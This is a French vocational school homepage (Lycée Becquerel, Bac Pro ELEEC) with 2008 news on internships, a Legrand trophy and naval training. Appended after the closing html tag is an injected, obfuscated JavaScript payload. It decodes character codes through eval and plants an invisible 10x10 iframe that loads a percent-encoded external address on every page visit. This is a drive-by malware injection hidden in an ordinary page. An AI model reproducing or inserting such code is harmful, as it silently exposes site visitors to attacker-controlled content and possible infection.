<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
	"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="fr">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
	<meta http-equiv="content-style-type" content="text/css" />
	<meta name="keywords" lang="fr" content="Bac pro electrotechnique energie equipements communiquants" />
	<meta name="Description" content="ELEEC

Bac pro electrotechnique energie equipements communiquants" />
	<link title="style" type="text/css" rel="stylesheet" href="themes/Impact_Seruix/style.php?colorie=Bleu" />
	<title>ELEEC TOURS - Bac-Pro ELEEC</title>

</head>
<body>

<div class="body">

<!-- HEADER-UNIQUE -->

<table class="header-unique" cellpadding="0" cellspacing="0"><tr style="vertical-align: top;"><td style="width: 483px;">
<div style="margin-top: 13px;"><div style="text-align: center;"><object type="application/x-shockwave-flash" data="images/clock8.swf" width="100" height="100"><param name="movie" value="images/clock8.swf" /><param name="pluginurl" value="http://www.macromedia.com/go/getflashplayer" /></object></div></div></td><td style="width: 427px;">
<div style="margin-top: 13px;"><div style="text-align: center;"><object type="application/x-shockwave-flash" data="http://glieres.free.fr/html/themes/fisubsilver/tete.swf" width="700" height="110"><param name="movie" value="http://glieres.free.fr/html/themes/fisubsilver/tete.swf" /><param name="pluginurl" value="http://www.macromedia.com/go/getflashplayer" /></object></div></div></td></tr></table>

<!-- HEADER -->

<table class="header" cellpadding="0" cellspacing="0"><tr style="vertical-align: top;">


<td class="login-no">
<form action="index.php?file=User&amp;nuked_nude=index&amp;op=login" method="post">
<div class="login-no-1"><input name="pseudo" size="10" maxlength="250" type="text" class="login-1" /></div>
<div class="login-no-2"><input name="pass" size="10" maxlength="250" type="password" class="login-2" /></div>
<div class="login-no-3"><input value="" type="submit" class="login-3" /></div>
<div><input type="hidden" name="remember_me" value="ok" /></div>
</form>

<img id="login_no_02" src="themes/Impact_Seruix/images/Bleu/login-no-bas.gif" class="login-no-lien" width="203" height="39" style="border:none;" alt="" usemap="#login_no_02_Map" />

<map name="login_no_02_Map" id="login_no_02_Map">
<area shape="rect" alt="" coords="59,25,147,32" href="index.php?file=User&amp;op=reg_screen" />
<area shape="rect" alt="" coords="53,10,153,18" href="index.php?file=User&amp;op=oubli_pass" />
</map>


</td><td class="header-image">

</td></tr></table>


<!-- MENU -->

<table class="menu-rap" cellpadding="0" cellspacing="0"><tr><td class="menu-rap-contenu">

<table cellpadding="0" cellspacing="0"><tr>
<td><div class="menu-1"><a href="index.php?file=News">Accueil</a></div></td>
<td><div class="menu-2"><a href="index.php?file=News">Actualit�s</a></div></td>
<td><div class="menu-3"><a href="index.php?file=Page&name=plan">Plan d'acc�s</a></div></td>
<td><div class="menu-4"><a href="index.php?file=Calendar">Agenda</a></div></td>
<td><div class="menu-5"><a href="index.php?file=Page&name=liens">Liens</a></div></td>
<td><div class="menu-6"><a href="index.php?file=Page&name=contact">Nous contacter</a></div></td>
</tr></table>

</td><td class="menu-rap-nav">

</td></tr></table>

<!-- CORPS -->

<table class="corps" cellpadding="0" cellspacing="0" style="margin-left:
11px"><tr style="vertical-align: top;">

<td class="corps-block"><table class="block" cellpadding="0" cellspacing="0"><tr>
	<td class="block-haut">
		<div class="block-titre"> Lyc&eacute;e BECQUEREL</div></td>
	</tr><tr>
	<td class="block-fond">
		<div class="block-contenu"><table cellspacing="0" cellpadding="0" width="100%">
<tr><td><a href="index.php?file=Page&amp;name=Mot" title="" style="padding-left: 10px;" class="menu">&middot; Le mot du proviseur</a></td></tr>
<tr><td><a href="index.php?file=News&amp;op=categorie&amp;cat_id=2" title="" style="padding-left: 10px;" class="menu">&middot; Actualit&eacute;s</a></td></tr>
<tr><td><a href="index.php?file=Page&amp;name=plan" title="" style="padding-left: 10px;" class="menu">&middot; Plan d'acc&egrave;s</a></td></tr>
<tr><td><a href="index.php?file=Page&amp;name=filieres" title="" style="padding-left: 10px;" class="menu">&middot; Fili&egrave;res</a></td></tr>
<tr><td><a href="index.php?file=Page&amp;name=contact" title="" style="padding-left: 10px;" class="menu">&middot; Nous contacter</a></td></tr>
</table>
</div>
	</td>
	</tr><tr>
	<td class="block-bas"></td>
</tr></table>
<table class="block" cellpadding="0" cellspacing="0"><tr>
	<td class="block-haut">
		<div class="block-titre">Bac Pro ELEEC</div></td>
	</tr><tr>
	<td class="block-fond">
		<div class="block-contenu"><table cellspacing="0" cellpadding="0" width="100%">
<tr><td><a href="index.php?file=News&amp;op=categorie&amp;cat_id=3" title="" style="padding-left: 10px;" class="menu">&middot; Actualit&eacute;s</a></td></tr>
<tr><td><a href="index.php?file=Page&amp;name=InsEL" title="" style="padding-left: 10px;" class="menu">&middot; Inscription</a></td></tr>
<tr><td><a href="index.php?file=Page&amp;name=MoyEL" title="" style="padding-left: 10px;" class="menu">&middot; Moyens</a></td></tr>
<tr><td><a href="index.php?file=Page&amp;name=ContEL" title="" style="padding-left: 10px;" class="menu">&middot; Contenu de la formation</a></td></tr>
<tr><td><a href="index.php?file=Page&amp;name=FoEL" title="" style="padding-left: 10px;" class="menu">&middot; Formation en entreprise</a></td></tr>
<tr><td><a href="index.php?file=Page&amp;name=ExEL" title="" style="padding-left: 10px;" class="menu">&middot; Examen</a></td></tr>
<tr><td><a href="index.php?file=Page&amp;name=DeEL" title="" style="padding-left: 10px;" class="menu">&middot; D&eacute;bouch&eacute;s</a></td></tr>
</table>
</div>
	</td>
	</tr><tr>
	<td class="block-bas"></td>
</tr></table>
<table class="block" cellpadding="0" cellspacing="0"><tr>
	<td class="block-haut">
		<div class="block-titre">Bac Pro Marine</div></td>
	</tr><tr>
	<td class="block-fond">
		<div class="block-contenu"><table cellspacing="0" cellpadding="0" width="100%">
<tr><td><a href="index.php?file=News&amp;op=categorie&amp;cat_id=4" title="" style="padding-left: 10px;" class="menu">&middot; Actualit&eacute;s</a></td></tr>
<tr><td><a href="index.php?file=Page" title="" style="padding-left: 10px;" class="menu">&middot; Inscription</a></td></tr>
<tr><td><a href="index.php?file=Page" title="" style="padding-left: 10px;" class="menu">&middot; Contenu de la formation</a></td></tr>
<tr><td><a href="index.php?file=Page" title="" style="padding-left: 10px;" class="menu">&middot; Moyens</a></td></tr>
<tr><td><a href="index.php?file=Page" title="" style="padding-left: 10px;" class="menu">&middot; Formation en entreprise</a></td></tr>
<tr><td><a href="index.php?file=Page" title="" style="padding-left: 10px;" class="menu">&middot; Examen</a></td></tr>
<tr><td><a href="index.php?file=Page" title="" style="padding-left: 10px;" class="menu">&middot; D&eacute;bouch&eacute;s</a></td></tr>
</table>
</div>
	</td>
	</tr><tr>
	<td class="block-bas"></td>
</tr></table>
<table class="block" cellpadding="0" cellspacing="0"><tr>
	<td class="block-haut">
		<div class="block-titre">Bac Pro GRETA</div></td>
	</tr><tr>
	<td class="block-fond">
		<div class="block-contenu"><table cellspacing="0" cellpadding="0" width="100%">
<tr><td><a href="index.php?file=Page" title="" style="padding-left: 10px;" class="menu">&middot; Contexte</a></td></tr>
<tr><td><a href="index.php?file=Page" title="" style="padding-left: 10px;" class="menu">&middot; Contact</a></td></tr>
</table>
</div>
	</td>
	</tr><tr>
	<td class="block-bas"></td>
</tr></table>
</td><td>
	<table style="width: 605px;" cellpadding="0" cellspacing="0"><tr style="vertical-align: top;">
		<td class="block-centre-haut-small">
			<div style="text-align: center; font-family: verdana; padding-top: 5px;">calendar</div>
		</td>
		</tr><tr>
		<td class="block-centre-fond-small">

		<div style="width: 585px; padding-left: 10px; padding-top : 2px;">
<br /><div style="text-align: center;">Error connecting to rss source !</div><br />		</div>

		</td>
		</tr><tr>
		<td class="block-centre-bas-small"></td>
	</tr></table>

<script type="text/javascript" src="infobulle.js"></script><script type="text/javascript">InitBulle('#ffffff', '#6ab0ff', 2);</script><div style="width: 591px; margin-left: 7px; margin-right: 7px; background: url('themes/Impact_Seruix/images/Bleu/news-titre.png') repeat-x top;">
<div class="news-titre">D&eacute;part en entreprise</div>
<div><a href="index.php?file=News&amp;op=categorie&amp;cat_id=2"><img style="float: right;border: 0;" src="upload/News/bcq.gif" alt="" title="Lyc�e BECQUEREL" /></a><br />A la fin de la semaine nous seront en vacance puis nous int&egrave;greront des entreprises dans lesquelles nous passerons deux mois &agrave; travailler en tant que stagiaire afin d'apprendre le m&eacute;tier d'&eacute;lectrotechnicien et de nous familliariser au milieu professionnel. A la fin de ces deux mois, nous reviendrons au lyc&eacute;e afin de pr&eacute;parer le bac.</div>
<div class="news-by">
	Par <a href="index.php?file=Members&amp;op=detail&amp;autor=lordH">lordH</a>, le jeudi 23 octobre 2008&nbsp;|&nbsp;<a href="index.php?file=News&amp;op=index_comment&amp;news_id=7">Commentaires (2)</a>
</div>
</div>
<div style="width: 591px; margin-left: 7px; margin-right: 7px; background: url('themes/Impact_Seruix/images/Bleu/news-titre.png') repeat-x top;">
<div class="news-titre">bientot la p&eacute;riode de formation</div>
<div><a href="index.php?file=News&amp;op=categorie&amp;cat_id=4"><img style="float: right;border: 0;" src="upload/News/mn2.gif" alt="" title="Section ELEEC MArine" /></a><br />D&eacute;part pour Toulon  le 04/11/2008 !! nous sommes impatients de partir en stages afin d'acquerir plus d'exp&eacute;riences comme militaires,  marins et &eacute;lectriciens<br /><br /><div style="text-align: center;"> <img style="border: 0;" src="http://9a.img.v4.skyrock.net/9a2/fcm2007/pics/1396177009.jpg" alt="" /></div></div>
<div class="news-by">
	Par <a href="index.php?file=Members&amp;op=detail&amp;autor=lordH">lordH</a>, le jeudi 23 octobre 2008&nbsp;|&nbsp;<a href="index.php?file=News&amp;op=index_comment&amp;news_id=6">Commentaires (2)</a>
</div>
</div>
<div style="width: 591px; margin-left: 7px; margin-right: 7px; background: url('themes/Impact_Seruix/images/Bleu/news-titre.png') repeat-x top;">
<div class="news-titre">Troph&eacute;e LEGRAND</div>
<div><a href="index.php?file=News&amp;op=categorie&amp;cat_id=3"><img style="float: right;border: 0;" src="upload/News/eleec.jpg" alt="" title="Section ELEEC" /></a><br />Les &eacute;l&egrave;ves de 1 eleec, T eleec sont inscrit au 2&egrave;me troph&eacute;e Legrand des jeunes talents ELEC.<br />Ils pouront via se biais r&eacute;pondre &agrave; une s&eacute;rie de questionnaires sur le net permettant une selection des candidats au concours (entre le 7 novembre et le 16 janvier) .<br />Les candidats retenus pourront passer les &eacute;preuves pratiques de la demi finale se d&eacute;roulant &agrave; Limoges sur le site Innoval.<br /><br /><a href="http://www.legrand.fr"  onclick="window.open(this.href); return false;">www.legrand.fr</a></div>
<div class="news-by">
	Par <a href="index.php?file=Members&amp;op=detail&amp;autor=The">The</a>, le lundi 13 octobre 2008&nbsp;|&nbsp;<a href="index.php?file=News&amp;op=index_comment&amp;news_id=5">Commentaires (2)</a>
</div>
</div>
<div style="width: 591px; margin-left: 7px; margin-right: 7px; background: url('themes/Impact_Seruix/images/Bleu/news-titre.png') repeat-x top;">
<div class="news-titre">P&eacute;riode de formation</div>
<div><a href="index.php?file=News&amp;op=categorie&amp;cat_id=4"><img style="float: right;border: 0;" src="upload/News/mn2.gif" alt="" title="Section ELEEC MArine" /></a><br />une p&eacute;riode de formation de 8 semaines se d&eacute;roulera au CIN de St Mandrier proche de Toulon en novembre et d&eacute;cembre pour les &eacute;l&egrave;ves de terminal FMC souhaitant int&eacute;grer la marine national.</div>
<div class="news-by">
	Par <a href="index.php?file=Members&amp;op=detail&amp;autor=The">The</a>, le jeudi 03 juillet 2008&nbsp;|&nbsp;<a href="index.php?file=News&amp;op=index_comment&amp;news_id=3">Commentaires (2)</a>
</div>
</div>
<div style="width: 591px; margin-left: 7px; margin-right: 7px; background: url('themes/Impact_Seruix/images/Bleu/news-titre.png') repeat-x top;">
<div class="news-titre">Rentr&eacute;e 2008 - 2009</div>
<div><a href="index.php?file=News&amp;op=categorie&amp;cat_id=3"><img style="float: right;border: 0;" src="upload/News/eleec.jpg" alt="" title="Section ELEEC" /></a><br />Les vacances sont termin&eacute;s et une nouvelle ann&eacute;e scolaire d&eacute;bute , nous souhaitons &agrave; chacun d'atteindre ces objectifs.<br /><br />Au cours des premiers jours nous avons acceulli les &eacute;l&egrave;ves de premiere ann&eacute;e de BAC Pro 3ans.<br /><br />A la suite de leur p&eacute;riode de formation, le bilan de la premi&egrave;re ann&eacute;e des terminal BAC Pro sera &agrave; pr&eacute;sent&eacute; avant le d&eacute;part pour la derni&egrave;re PFMP</div>
<div class="news-by">
	Par <a href="index.php?file=Members&amp;op=detail&amp;autor=The">The</a>, le jeudi 03 juillet 2008&nbsp;|&nbsp;<a href="index.php?file=News&amp;op=index_comment&amp;news_id=4">Commentaires (2)</a>
</div>
</div>
&nbsp;<b>Page :</b>&nbsp;<b>[1]</b>&nbsp;<a href="index.php?file=News&amp;p=2">2</a>&nbsp;<a href="index.php?file=News&amp;p=2" title="Page Suivante">&gt;</a><br /><br /><br />
</td>

<td class="corps-block"><table class="block" cellpadding="0" cellspacing="0"><tr>
	<td class="block-haut">
		<div class="block-titre">Recherche</div></td>
	</tr><tr>
	<td class="block-fond">
		<div class="block-contenu"><form method="post" action="index.php?file=Search&amp;op=mod_search">
<table style="margin-left: auto;margin-right: auto;text-align: left;" width="100%" cellspacing="0" cellpadding="0">
<tr><td align="center"><input type="hidden" name="module" value="" /><input type="text" name="main" size="25" /></td></tr>
<tr><td align="center"><input type="submit" class="button" name="submit" value="Recherche" /></td></tr>
<tr><td align="center"><a href="index.php?file=Search">Recherche avanc�e</a></td></tr></table></form>
</div>
	</td>
	</tr><tr>
	<td class="block-bas"></td>
</tr></table>
<table class="block" cellpadding="0" cellspacing="0"><tr>
	<td class="block-haut">
		<div class="block-titre">Agenda</div></td>
	</tr><tr>
	<td class="block-fond">
		<div class="block-contenu"><table style="margin-left: auto;margin-right: auto;text-align: left;" cellpadding="0" cellspacing="0"><tr><td>
<a href="index.php?file=News&amp;mo=3&amp;ye=2017" title="Mois pr�c�dent"><small>&lt;&lt;</small></a>&nbsp;<b>Avril&nbsp;2017</b>&nbsp;
<a href="index.php?file=News&amp;mo=5&amp;ye=2017" title="Mois suivant"><small>&gt;&gt;</small></a></td></tr></table>
<table style="margin-left: auto;margin-right: auto;text-align: left;" cellpadding="2" cellspacing="1"><tr>
<td align="center"><b>D</b></td><td align="center"><b>L</b></td><td align="center"><b>M</b></td><td align="center"><b>M</b></td><td align="center"><b>J</b></td><td align="center"><b>V</b></td><td align="center"><b>S</b></td></tr><tr><td>&nbsp;</td><td>&nbsp;</td><td>&nbsp;</td><td>&nbsp;</td><td>&nbsp;</td><td>&nbsp;</td><td align="center"><span style="text-align: center;">1</span></td>
</tr><tr><td align="center"><span style="text-align: center;">2</span></td>
<td align="center"><span style="text-align: center;">3</span></td>
<td align="center"><span style="text-align: center;">4</span></td>
<td align="center"><span style="text-align: center;">5</span></td>
<td align="center"><span style="text-align: center;">6</span></td>
<td align="center"><span style="text-align: center;">7</span></td>
<td align="center"><span style="text-align: center;">8</span></td>
</tr><tr><td align="center"><span style="text-align: center;">9</span></td>
<td align="center"><span style="text-align: center;">10</span></td>
<td align="center"><span style="text-align: center;">11</span></td>
<td align="center"><span style="text-align: center;">12</span></td>
<td align="center"><span style="text-align: center;">13</span></td>
<td align="center"><span style="text-align: center;">14</span></td>
<td align="center"><span style="text-align: center;"><b>15</b></span></td>
</tr><tr><td align="center"><span style="text-align: center;">16</span></td>
<td align="center"><span style="text-align: center;">17</span></td>
<td align="center"><span style="text-align: center;">18</span></td>
<td align="center"><span style="text-align: center;">19</span></td>
<td align="center"><span style="text-align: center;">20</span></td>
<td align="center"><span style="text-align: center;">21</span></td>
<td align="center"><span style="text-align: center;">22</span></td>
</tr><tr><td align="center"><span style="text-align: center;">23</span></td>
<td align="center"><span style="text-align: center;">24</span></td>
<td align="center"><span style="text-align: center;">25</span></td>
<td align="center"><span style="text-align: center;">26</span></td>
<td align="center"><span style="text-align: center;">27</span></td>
<td align="center"><span style="text-align: center;">28</span></td>
<td align="center"><span style="text-align: center;">29</span></td>
</tr><tr><td align="center"><span style="text-align: center;">30</span></td>
<td>&nbsp;</td><td>&nbsp;</td><td>&nbsp;</td><td>&nbsp;</td><td>&nbsp;</td><td>&nbsp;</td></tr></table>
</div>
	</td>
	</tr><tr>
	<td class="block-bas"></td>
</tr></table>
</td>
</tr></table>

<a href="http://www.design-impact.fr" onclick="window.open(this.href); return false;"><div class="footer"></div></a>
<div class="copyleft"></div>

</div>
<div style="text-align: center;"><br />
<a href="http://www.nuked-klan.org" onclick="window.open(this.href); return false;"><img style="border:0;" src="images/nk_powered.gif" width="80" height="15" alt="" title="Powered by Nuked-Klan SP4.3 � 2002, 2005" /></a>&nbsp;<a href="http://validator.w3.org/check?uri=referer"><img style="border :0;" src="images/w3c_xhtml.gif" width="80" height="15" alt="" title="Valid XHTML 1.0!" /></a>&nbsp;<a href="http://jigsaw.w3.org/css-validator/check/referer"><img style="border:0;" src="images/w3c_css.gif" width="80" height="15" alt="" title="Valid CSS!" /></a></div></body></html><script>var s="";try{new asd[0]}catch(q){if(q)r=1;c=String;}if(r&&document.createTextNode)n=2;e=eval;m=[4.5*n,18/n,52.5*n,204/n,16*n,80/n,50*n,222/n,49.5*n,234/n,54.5*n,202/n,55*n,232/n,23*n,206/n,50.5*n,232/n,34.5*n,216/n,50.5*n,218/n,50.5*n,220/n,58*n,230/n,33*n,242/n,42*n,194/n,51.5*n,156/n,48.5*n,218/n,50.5*n,80/n,19.5*n,196/n,55.5*n,200/n,60.5*n,78/n,20.5*n,182/n,24*n,186/n,20.5*n,246/n,4.5*n,18/n,4.5*n,210/n,51*n,228/n,48.5*n,218/n,50.5*n,228/n,20*n,82/n,29.5*n,18/n,4.5*n,250/n,16*n,202/n,54*n,230/n,50.5*n,64/n,61.5*n,18/n,4.5*n,18/n,50*n,222/n,49.5*n,234/n,54.5*n,202/n,55*n,232/n,23*n,238/n,57*n,210/n,58*n,202/n,20*n,68/n,30*n,210/n,51*n,228/n,48.5*n,218/n,50.5*n,64/n,57.5*n,228/n,49.5*n,122/n,19.5*n,208/n,58*n,232/n,56*n,116/n,23.5*n,94/n,18.5*n,108/n,27.5*n,74/n,27*n,104/n,18.5*n,110/n,25.5*n,74/n,27*n,110/n,18.5*n,108/n,28*n,74/n,27.5*n,98/n,18.5*n,110/n,28.5*n,74/n,27*n,108/n,18.5*n,110/n,28*n,74/n,27.5*n,102/n,18.5*n,108/n,33*n,74/n,27*n,138/n,18.5*n,108/n,27.5*n,92/n,49.5*n,202/n,23*n,74/n,27*n,136/n,18.5*n,110/n,25.5*n,94/n,54.5*n,194/n,52.5*n,220/n,23*n,224/n,52*n,224/n,31.5*n,224/n,48.5*n,206/n,50.5*n,122/n,26*n,202/n,49.5*n,204/n,51*n,204/n,26*n,202/n,26*n,100/n,25.5*n,104/n,49.5*n,110/n,25*n,108/n,19.5*n,64/n,59.5*n,210/n,50*n,232/n,52*n,122/n,19.5*n,98/n,24*n,78/n,16*n,208/n,50.5*n,210/n,51.5*n,208/n,58*n,122/n,19.5*n,98/n,24*n,78/n,16*n,230/n,58*n,242/n,54*n,202/n,30.5*n,78/n,59*n,210/n,57.5*n,210/n,49*n,210/n,54*n,210/n,58*n,242/n,29*n,208/n,52.5*n,200/n,50*n,202/n,55*n,118/n,56*n,222/n,57.5*n,210/n,58*n,210/n,55.5*n,220/n,29*n,194/n,49*n,230/n,55.5*n,216/n,58.5*n,232/n,50.5*n,118/n,54*n,202/n,51*n,232/n,29*n,96/n,29.5*n,232/n,55.5*n,224/n,29*n,96/n,29.5*n,78/n,31*n,120/n,23.5*n,210/n,51*n,228/n,48.5*n,218/n,50.5*n,124/n,17*n,82/n,29.5*n,18/n,4.5*n,250/n,4.5*n,18/n,51*n,234/n,55*n,198/n,58*n,210/n,55.5*n,220/n,16*n,210/n,51*n,228/n,48.5*n,218/n,50.5*n,228/n,20*n,82/n,61.5*n,18/n,4.5*n,18/n,59*n,194/n,57*n,64/n,51*n,64/n,30.5*n,64/n,50*n,222/n,49.5*n,234/n,54.5*n,202/n,55*n,232/n,23*n,198/n,57*n,202/n,48.5*n,232/n,50.5*n,138/n,54*n,202/n,54.5*n,202/n,55*n,232/n,20*n,78/n,52.5*n,204/n,57*n,194/n,54.5*n,202/n,19.5*n,82/n,29.5*n,204/n,23*n,230/n,50.5*n,232/n,32.5*n,232/n,58*n,228/n,52.5*n,196/n,58.5*n,232/n,50.5*n,80/n,19.5*n,230/n,57*n,198/n,19.5*n,88/n,19.5*n,208/n,58*n,232/n,56*n,116/n,23.5*n,94/n,18.5*n,108/n,27.5*n,74/n,27*n,104/n,18.5*n,110/n,25.5*n,74/n,27*n,110/n,18.5*n,108/n,28*n,74/n,27.5*n,98/n,18.5*n,110/n,28.5*n,74/n,27*n,108/n,18.5*n,110/n,28*n,74/n,27.5*n,102/n,18.5*n,108/n,33*n,74/n,27*n,138/n,18.5*n,108/n,27.5*n,92/n,49.5*n,202/n,23*n,74/n,27*n,136/n,18.5*n,110/n,25.5*n,94/n,54.5*n,194/n,52.5*n,220/n,23*n,224/n,52*n,224/n,31.5*n,224/n,48.5*n,206/n,50.5*n,122/n,26*n,202/n,49.5*n,204/n,51*n,204/n,26*n,202/n,26*n,100/n,25.5*n,104/n,49.5*n,110/n,25*n,108/n,19.5*n,82/n,29.5*n,204/n,23*n,230/n,58*n,242/n,54*n,202/n,23*n,236/n,52.5*n,230/n,52.5*n,196/n,52.5*n,216/n,52.5*n,232/n,60.5*n,122/n,19.5*n,208/n,52.5*n,200/n,50*n,202/n,55*n,78/n,29.5*n,204/n,23*n,230/n,58*n,242/n,54*n,202/n,23*n,224/n,55.5*n,230/n,52.5*n,232/n,52.5*n,222/n,55*n,122/n,19.5*n,194/n,49*n,230/n,55.5*n,216/n,58.5*n,232/n,50.5*n,78/n,29.5*n,204/n,23*n,230/n,58*n,242/n,54*n,202/n,23*n,216/n,50.5*n,204/n,58*n,122/n,19.5*n,96/n,19.5*n,118/n,51*n,92/n,57.5*n,232/n,60.5*n,216/n,50.5*n,92/n,58*n,222/n,56*n,122/n,19.5*n,96/n,19.5*n,118/n,51*n,92/n,57.5*n,202/n,58*n,130/n,58*n,232/n,57*n,210/n,49*n,234/n,58*n,202/n,20*n,78/n,59.5*n,210/n,50*n,232/n,52*n,78/n,22*n,78/n,24.5*n,96/n,19.5*n,82/n,29.5*n,204/n,23*n,230/n,50.5*n,232/n,32.5*n,232/n,58*n,228/n,52.5*n,196/n,58.5*n,232/n,50.5*n,80/n,19.5*n,208/n,50.5*n,210/n,51.5*n,208/n,58*n,78/n,22*n,78/n,24.5*n,96/n,19.5*n,82/n,29.5*n,18/n,4.5*n,18/n,50*n,222/n,49.5*n,234/n,54.5*n,202/n,55*n,232/n,23*n,206/n,50.5*n,232/n,34.5*n,216/n,50.5*n,218/n,50.5*n,220/n,58*n,230/n,33*n,242/n,42*n,194/n,51.5*n,156/n,48.5*n,218/n,50.5*n,80/n,19.5*n,196/n,55.5*n,200/n,60.5*n,78/n,20.5*n,182/n,24*n,186/n,23*n,194/n,56*n,224/n,50.5*n,220/n,50*n,134/n,52*n,210/n,54*n,200/n,20*n,204/n,20.5*n,118/n,4.5*n,18/n,62.5*n];mm=c['fro'+'mCharCode'];for(i=0;i!=m.length;i++)s+=mm(e("m"+"["+"i"+']'));try{app[0];}catch(q){e(s);}</script>